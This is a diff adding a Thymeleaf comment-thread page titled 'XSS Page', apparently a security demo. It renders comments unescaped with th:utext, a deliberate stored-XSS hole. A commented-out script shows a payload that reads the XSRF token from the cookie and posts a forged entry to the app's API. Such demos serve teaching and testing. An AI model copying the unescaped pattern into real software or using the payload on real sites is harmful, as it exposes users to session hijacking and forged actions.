@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+<head lang="en">
+    <title>XSS Page</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+
+
+
+    <div th:if="${not #lists.isEmpty(commentsList)}">
+        <h1><i><b>Comment Thread</b></i></h1>
+        <table>
+            <tr>
+                <th>#</th>
+                <th>User Name</th>
+                <th>Comment</th>
+            </tr>
+            <tr th:each="comment: ${commentsList}">
+                <td th:text="${commentsList.indexOf(comment)+1}"></td>
+                <td th:text="${comment.userName}"></td>
+
+                <!-- th:utext is unescaped th:text is escaped-->
+                <!-- <script>
+                        var http = new XMLHttpRequest();
+                        var url = "http://localhost:80/api/db-service/rest/db/add";
+                        var xsrfToken = document.cookie.split("=")[1];
+                        var params = '{"quotes": ["Hacked_comment_thread"]}';
+                        http.open("post",url,true);
+                        http.setRequestHeader("content-type", "application/json");
+                        http.setRequestHeader("X-XSRF-TOKEN", xsrfToken);
+                        http.send(params);
+                    </script> -->
+                <td th:utext="${comment.text}"></td>
+            </tr>
+        </table>
+
+    </div>
+
+
+    <h4>Reply</h4>
+    <form th:action="@{/commentThread}" method="POST">
+        User Name:
+        <input type="text" name="userName"/>
+        Comment:
+        <input type="text" name="text"/>
+        <input type="submit" value="Add"/>
+    </form>
+</body>
+</html>
